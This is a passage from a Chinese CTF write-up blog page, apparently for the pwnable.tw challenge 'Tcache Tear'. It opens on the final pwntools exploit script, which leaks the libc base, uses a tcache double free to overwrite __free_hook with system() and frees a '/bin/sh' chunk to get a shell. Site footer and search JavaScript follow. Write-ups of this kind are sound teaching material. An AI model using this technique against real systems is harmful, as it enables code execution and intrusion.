addr on 0x602060+0x10</span></span><br><span class="line">my_free()</span><br><span class="line"></span><br><span class="line"><span class="comment"># calc libc_addr</span></span><br><span class="line">my_info()</span><br><span class="line">myproc.recvuntil(<span class="string">&#x27;Name :&#x27;</span>)</span><br><span class="line">myproc.recv(<span class="number">0x10</span>)</span><br><span class="line">libc_addr = u64(myproc.recv(<span class="number">0x8</span>)) - <span class="number">0x3ebca0</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># hijack __free_hook</span></span><br><span class="line">free_hook = libc_addr + mylibc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">system_addr = libc_addr + mylibc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"><span class="comment"># 1、将free_hook所在地址的值覆盖为system函数的地址值</span></span><br><span class="line">my_malloc(<span class="number">0x90</span>,<span class="string">&#x27;b&#x27;</span>)</span><br><span class="line">my_free()</span><br><span class="line">my_free()</span><br><span class="line">my_malloc(<span class="number">0x90</span>,p64(free_hook))</span><br><span class="line">my_malloc(<span class="number">0x90</span>,<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">my_malloc(<span class="number">0x90</span>,p64(system_addr))</span><br><span class="line"><span class="comment"># 2、使void *ptr指向“/bin/sh”，后续free(ptr)时相当于执行system(&quot;/bin/sh&quot;)</span></span><br><span class="line">my_malloc(<span class="number">0x80</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">my_free()</span><br><span class="line"><span class="comment"># gdb.attach(myproc,&#x27;b * 0x00400c02 \nc&#x27;)</span></span><br><span class="line">myproc.interactive()</span><br></pre></td></tr></table></div></figure>
+
+
+
+
+
+
+
+
+
+
+</div><footer class="post-footer"><div class="post-ending ending"><div class="ending__text">------ 本文结束，感谢您的阅读 ------</div></div><div class="post-copyright copyright"><div class="copyright-author"><span class="copyright-author__name">本文作者: </span><span class="copyright-author__value"><a href="http://blingblingxuanxuan.github.io">blingbling</a></span></div><div class="copyright-link"><span class="copyright-link__name">本文链接: </span><span class="copyright-link__value"><a href="http://blingblingxuanxuan.github.io/2020/03/13/tcachetear/">http://blingblingxuanxuan.github.io/2020/03/13/tcachetear/</a></span></div><div class="copyright-notice"><span class="copyright-notice__name">版权声明: </span><span class="copyright-notice__value">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" rel="external nofollow" target="_blank">BY-NC-SA</a> 许可协议。转载请注明出处！</span></div></div><div class="post-tags"><span class="post-tags-item"><span class="post-tags-item__icon"><i class="fas fa-tag"></i></span><a class="post-tags-item__link" href="http://blingblingxuanxuan.github.io/tags/heap/">heap</a></span><span class="post-tags-item"><span class="post-tags-item__icon"><i class="fas fa-tag"></i></span><a class="post-tags-item__link" href="http://blingblingxuanxuan.github.io/tags/tcache/">tcache</a></span></div><nav class="post-paginator paginator"><div class="paginator-prev"><a class="paginator-prev__link" href="/2020/03/20/SecretGarden/"><span class="paginator-prev__icon"><i class="fas fa-angle-left"></i></span><span class="paginator-prev__text">pwnable.tw之SecretGarden</span></a></div><div class="paginator-next"><a class="paginator-next__link" href="/2020/03/07/applestore/"><span class="paginator-prev__text">pwnable.tw之applestore</span><span class="paginator-next__icon"><i class="fas fa-angle-right"></i></span></a></div></nav></footer></div></div></div><div class="sidebar-wrap" id="sidebar-wrap"><aside class="sidebar" id="sidebar"><div class="sidebar-nav"><span class="sidebar-nav-toc current">文章目录</span><span class="sidebar-nav-ov">站点概览</span></div><section class="sidebar-toc"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#1-%E5%88%86%E6%9E%90"><span class="toc-number">1.</span> <span class="toc-text">
+          1 分析</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-1-linux%E4%B8%8B%E6%9F%A5%E7%9C%8B%E4%BA%8C%E8%BF%9B%E5%88%B6%E4%BF%A1%E6%81%AF"><span class="toc-number">1.1.</span> <span class="toc-text">
+          1.1 linux下查看二进制信息</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-2-IDA%E9%80%86%E5%90%91%E6%BA%90%E7%A0%81%E9%80%BB%E8%BE%91"><span class="toc-number">1.2.</span> <span class="toc-text">
+          1.2 IDA逆向源码逻辑</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-3-%E6%BC%8F%E6%B4%9E%E8%A7%A6%E5%8F%91-%E4%BB%BB%E6%84%8F%E5%9C%B0%E5%9D%80%E5%86%99"><span class="toc-number">1.3.</span> <span class="toc-text">
+          1.3 漏洞触发 - 任意地址写</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#2-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">2.</span> <span class="toc-text">
+          2 漏洞利用</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#2-1-%E6%B3%84%E9%9C%B2libc%E5%9F%BA%E5%9D%80"><span class="toc-number">2.1.</span> <span class="toc-text">
+          2.1 泄露libc基址</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-2-%E6%8E%A7%E5%88%B6libc%E4%B8%AD%E7%9A%84%E5%87%BD%E6%95%B0%E6%8C%87%E9%92%88"><span class="toc-number">2.2.</span> <span class="toc-text">
+          2.2 控制libc中的函数指针</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#3-EXP"><span class="toc-number">3.</span> <span class="toc-text">
+          3 EXP</span></a></li></ol></section><!-- ov = overview--><section class="sidebar-ov hide"><div class="sidebar-ov-author"><div class="sidebar-ov-author__avatar"><img class="sidebar-ov-author__avatar_img" src="/uploads/zhishi1.jpg" alt="avatar"></div></div><div class="sidebar-ov-social"><a class="sidebar-ov-social-item" href="https://github.com/blingblingxuanxuan" target="_blank" rel="noopener" data-popover="Github" data-popover-pos="up"><span class="sidebar-ov-social-item__icon"><i class="fab fa-github"></i></span></a><a class="sidebar-ov-social-item" href="https://weibo.com/anxinbuzitreexy" target="_blank" rel="noopener" data-popover="微博" data-popover-pos="up"><span class="sidebar-ov-social-item__icon"><i class="fab fa-weibo"></i></span></a></div><div class="sidebar-ov-cc"><a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" target="_blank" rel="noopener" data-popover="知识共享许可协议" data-popover-pos="up"><img src="/images/cc-by-nc-sa.svg"></a></div></section><div class="sidebar-reading"><div class="sidebar-reading-info"><span class="sidebar-reading-info__text">你已阅读了 </span><span class="sidebar-reading-info__num">0</span><span class="sidebar-reading-info__perc">%</span></div><div class="sidebar-reading-line"></div></div></aside></div><div class="clearfix"></div></div></main><footer class="footer" id="footer"><div class="footer-inner"><div><span>Copyright © 2021</span><span class="footer__icon"><i class="fas fa-heart"></i></span><span>blingbling</span></div><div><span>由 <a href="http://hexo.io/" title="Hexo" target="_blank" rel="noopener">Hexo</a> 强力驱动</span><span> v5.3.0</span><span class="footer__devider">|</span><span>主题 - <a href="https://github.com/liuyib/hexo-theme-stun/" title="Stun" target="_blank" rel="noopener">Stun</a></span><span> v2.6.2</span></div><div class="busuanzi"><span class="busuanzi-siteuv"><span class="busuanzi-siteuv__icon"><i class="fas fa-user"></i></span><span class="busuanzi-siteuv__info">访问人数</span><span class="busuanzi-siteuv__value" id="busuanzi_value_site_uv"></span></span><span class="busuanzi-sitepv"><span class="busuanzi-siteuv__icon"><i class="fas fa-eye"></i></span><span class="busuanzi-siteuv__info">浏览总量</span><span class="busuanzi-siteuv__value" id="busuanzi_value_site_pv"></span></span></div><div>Just follow your heart, and keep smiling.</div></div></footer><div class="loading-bar" id="loading-bar"><div class="loading-bar__progress"></div></div><div class="back2top" id="back2top"><span class="back2top__icon"><i class="fas fa-rocket"></i></span></div></div><div class="search-mask"></div><div class="search-popup"><span class="search-close"></span><div class="search-input"><input placeholder="搜索文章（支持多关键词，请用空格分隔）"></div><div class="search-results"></div></div><script src="https://cdn.jsdelivr.net/npm/jquery@v3.4.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.ui.min.js"></script><script>function initSearch() {
+  var isXML = true;
+  var search_path = 'search.json';
+
+  if (!search_path) {
+    search_path = 'search.xml';
+  } else if (/json$/i.test(search_path)) {
+    isXML = false;
+  }
+
+  var path = '/' + search_path;
+  $.ajax({
+    url: path,
+    dataType: isXML ? 'xml' : 'json',
+    async: true,
+    success: function (res) {
+      var datas = isXML ? $('entry', res).map(function () {
+        // 将 XML 转为 JSON
+        return {
+          title: $('title', this).text(),
+          content: $('content', this).text(),
+          url: $('url', this).text()
+        };
+      }).get() : res;
+      var $input = $('.search-input input');
+      var $result = $('.search-results');
+      // 搜索对象（标题、内容）的权重，影响显示顺序
+      var WEIGHT = { title: 100, content: 1 };
+      var searchPost = function () {
+        var searchText = $input.val().toLowerCase().trim();
+        // 根据空白字符分隔关键字
+        var keywords = searchText.split(/[\s]+/);
+        // 搜索结果
+        var matchPosts = [];
+
+        // 有多个关键字时，将原文字整个保存下来
+        if (keywords.length > 1) {
+          keywords.push(searchText);
+        }
+        // 防止未输入字符时搜索
+        if (searchText.length > 0) {
+          datas.forEach(function (data) {
+            var isMatch  = false;
+            // 没有标题的文章使用预设的 i18n 变量代替
+            var title = (data.title && data.title.trim()) || '[ 文章无标题 ]';
+            var titleLower = title && title.toLowerCase();
+            // 删除 HTML 标签 和 所有空白字符
+            var content = data.content && data.content.replace(/<[^>]+>/g, '');
+            var contentLower = content && content.toLowerCase();
+            // 删除重复的 /
+            var postURL = data.url && decodeURI(data.url).replace(/\/{2,}/g, '/');
+            // 标题中匹配到的关键词
+            var titleHitSlice = [];
+            // 内容中匹配到的关键词
+            var contentHitSlice = [];
+
+            keywords.forEach(function (keyword) {
+              /**
+              * 获取匹配的关键词的索引
+              * @param {String} keyword 要匹配的关键字
+              * @param {String} text 原文字
+              * @param {Boolean} caseSensitive 是否区分大小写
+              * @param {Number} weight 匹配对象的权重。权重大的优先显示
+              * @return {Array}
+              */
+              function getIndexByword (word, text, caseSensitive, weight) {
+                if (!word || !text) {
+                  return [];
+                };
+
+                var startIndex = 0; // 每次匹配的开始索引
+                var index = -1;     // 匹配到的索引值
+                var result = [];    // 匹配结果
+
+                if (!caseSensitive) {
+                  word = word.toLowerCase();
+                  text = text.toLowerCase();
+                }
+
+                while((index = text.indexOf(word, startIndex)) !== -1) {
+                  var hasMatch = false;
+                  // 索引位置相同的关键词，保留长度较长的
+                  titleHitSlice.forEach(function (hit) {
+                    if (hit.index === index && hit.word.length < word.length) {
+                      hit.word = word;
+                      hasMatch = true;
+                    }
+                  });
+                  startIndex = index + word.length;
+                  !hasMatch && result.push({ index: index, word: word, weight: weight });
+                }
+                return result;
+              }
+              titleHitSlice = titleHitSlice.concat(getIndexByword(keyword, titleLower, false, WEIGHT.title));
+              contentHitSlice = contentHitSlice.concat(getIndexByword(keyword, contentLower, false, WEIGHT.content));
+            });
+
+            var hitTitle = titleHitSlice.length;
+            var hitContent = contentHitSlice.length;
+
+            if (hitTitle > 0 || hitContent > 0) {
+              isMatch = true;
+            }
+            if (isMatch) {
+              ;[titleHitSlice, contentHitSlice].forEach(function (hit) {
+                // 按照匹配文字的索引的递增顺序排序
+                hit.sort(function (left, right) {
+                  return left.index - right.index;
+                });
+              });
+              /**
+              * 给文本中匹配到的关键词添加标记，从而进行高亮显示
+              * @param {String} text 原文本
+              * @param {Array} hitSlice 匹配项的索引信息
+              * @param {Number} start 开始索引
+              * @param {Number} end 结束索引
+              * @return {String}
+              */
+              function highlightKeyword (text, hitSlice, start, end) {
+                if (!text || !hitSlice || !hitSlice.length) {
+                  return;
+                }
+
+                var result = '';
+                var startIndex = start;
+                var endIndex = end;
+                hitSlice.forEach(function (hit) {
+                  if (hit.index < startIndex) {
+                    return;
+                  }
+
+                  var hitWordEnd = hit.index + hit.word.length;
+                  result += text.slice(startIndex, hit.index);
+                  result += '<b>' + text.slice(hit.index, hitWordEnd) + '</b>';
+                  startIndex = hitWordEnd;
+                });
+                result += text.slice(startIndex, endIndex);
+                return result;
+              }
+
+              var postData = {};
+              // 文章总的搜索权重
+              var postWeight = titleHitSlice.length * WEIGHT.title + contentHitSlice.length * WEIGHT.content;
+              // 标记匹配关键词后的标题
+              var postTitle = highlightKeyword(title, titleHitSlice, 0, title.length) || title;
+              // 标记匹配关键词后的内容
+              var postContent;
+              // 显示内容的长度
+              var SHOW_WORD_LENGTH = 200;
+              // 命中关键词前的字符显示长度
+              var SHOW_WORD_FRONT_LENGTH = 20;
+              var SHOW_WORD_END_LENGTH = SHOW_WORD_LENGTH - SHOW_WORD_FRONT_LENGTH;
+
+              // 截取匹配的第一个字符，前后共 200 个字符来显示
+              if (contentHitSlice.length > 0) {
+                var firstIndex = contentHitSlice[0].index;
+                var start = firstIndex > SHOW_WORD_FRONT_LENGTH ? firstIndex - SHOW_WORD_FRONT_LENGTH : 0;
+                var end = firstIndex + SHOW_WORD_END_LENGTH;
+                postContent = highlightKeyword(content, contentHitSlice, start, end);
+              } else { // 未匹配到内容，直接截取前 200 个字符来显示
+                postContent = content.slice(0, SHOW_WORD_LENGTH);
+              }
+              postData.title = postTitle;
+              postData.content = postContent;
+              postData.url = postURL;
+              postData.weight = postWeight;
+              matchPosts.push(postData);
+            }
+          });
+        }
+
+        var resultInnerHtml = '';
+        if (matchPosts.length) {
+          // 按权重递增的顺序排序，使权重大的优先显示
+          matchPosts.sort(function (left, right) {
+            return right.weight - left.weight;
+          });
+          resultInnerHtml += '<ul>';
+          matchPosts.forEach(function (post) {
+            resultInnerHtml += '<li><a class="search-results-title" href="' + post.url + '">';
+            resultInnerHtml += post.title;
+            resultInnerHtml += '</a><div class="search-results-content">';
+            resultInnerHtml += post.content;
+            resultInnerHtml += '</div></li>';
+          });
+          resultInnerHtml += '</ul>';
+        } else {
+          resultInnerHtml += '<div class="search-results-none"><i class="far fa-meh"></i></div>';
+        }
+        $result.html(resultInnerHtml);
+      };
+      $input.on('input', searchPost);
+      $input.on('keyup', function (e) {
+        if (e.keyCode === Stun.utils.codeToKeyCode('Enter')) {
+          searchPost();
+        }
+      });
+    }
+  });
+}
+
+function closeSearch () {
+  $('body').css({ overflow: 'auto' });
+  $('.search-popup').css({ display: 'none' });
+  $('.search-mask').css({ display: 'none' });
+}
+
+window.addEventListener('DOMContentLoaded', function () {
+  Stun.utils.pjaxReloadLocalSearch = function () {
+    $('.header-nav-search').on('click', function (e) {
+      e.stopPropagation();
+      $('body').css('overflow', 'hidden');
+      $('.search-popup')
+        .velocity('stop')
+        .velocity('transition.expandIn', {
+          duration: 300,
+          complete: function () {
+            $('.search-popup input').focus();
+          }
+        });
+      $('.search-mask')
+        .velocity('stop')
+        .velocity('transition.fadeIn', {
+          duration: 300
+        });
+
+      initSearch();
+    });
+    $('.search-mask, .search-close').on('click', function () {
+      closeSearch();
+    });
+    $(document).on('keydown', function (e) {
+      // Escape <=> 27
+      if (e.keyCode === Stun.utils.codeToKeyCode('Escape')) {
+        closeSearch();
+      }
+    });
+  };
+
+  Stun.utils.pjaxReloadLocalSearch();
+}, false);
+
+function safeOpenUrl(url) {
+  var newTab = window.open();
+  newTab.opener = null;
+  newTab.location = url;
+}
+
+function extSearch(engine) {
+  var engines = {
+    google: 'https://www.google.com/search?q=',
+    bing: 'https://cn.bing.com/search?q=',
+    baidu: 'https://www.baidu.com/s?ie=UTF-8&wd=',
+  };
+  var host = window.location.host;
+  var query = $('.search-input input').val().toLowerCase().trim();
+  var uri = engines[engine] + query + ' site:' + host;
+
+  if (query) {
+    safeOpenUrl(uri);
+  } else {
+    Stun.utils.popAlert('warning', '请输入字符');
+  }
+}
+
+var assistSearchList = window.CONFIG.assistSearch;
+
+if (Array.isArray(assistSearchList)) {
+  assistSearchList.forEach(function (name) {
+    document.querySelector('.search-btns-item--' + name).addEventListener('click', function () {
+      extSearch(name);
+    }, false);
+  });
+}</script><script src="https://cdn.jsdelivr.net/gh/sukkaw/busuanzi@latest/bsz.pure.mini.js" async></script><script src="/js/utils.js?v=2.6.2"></script><script src="/js/stun-boot.js?v=2.6.2"></script><script src="/js/scroll.js?v=2.6.2"></script><script src="/js/header.js?v=2.6.2"></script><script src="/js/sidebar.js?v=2.6.2"></script><script type="application/json" src="/search.json"></script></body></html>
